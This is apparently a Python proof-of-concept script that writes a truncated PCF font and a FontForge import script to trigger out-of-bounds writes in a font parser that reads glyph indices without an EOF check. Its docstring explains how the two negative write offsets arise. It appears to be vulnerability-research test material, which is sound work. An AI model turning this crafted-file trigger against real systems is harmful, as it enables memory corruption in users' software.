#!/usr/bin/env python3
"""W29: one truncated BDF_ENCODINGS table with two loop iterations.

The pinned parser reads glyph indices with getc() and no EOF check. With one
trailing low byte b the first index is b|(EOF<<8) = b-256; every later index is
EOF|(EOF<<8) = -1. So one file can write to two distinct negative offsets:
iteration 0 to encs[(b-256)*4], iteration 1 and later always to encs[-4].

TOC/table layout is the pinned truncated.pcf layout used by
make-callpath-case.py. min2=0,max2=1,min1=max1=0 gives tot=2 and divisor 2:
the pinned RHS writes 0 at i=0 and 1 at i=1.
"""
import pathlib
import struct

HERE = pathlib.Path(__file__).resolve().parent
data = bytearray((HERE / "truncated.pcf").read_bytes()[:0x123])
struct.pack_into("<HHHH", data, 0x118, 0, 1, 0, 0)
data[0x122] = 0xFE  # glyph -2 at i=0; EOF gives glyph -1 at i=1
out = HERE / "twostore.pcf"
out.write_bytes(data)
(HERE / "import-twostore.ff").write_text(f'New()\nImport("{HERE / "twostore.pcf"}")\n')
print(f"twostore.pcf: {len(data)} bytes, tot=2, i=0 glyph=-2 value=0, i=1 glyph=-1 value=1")
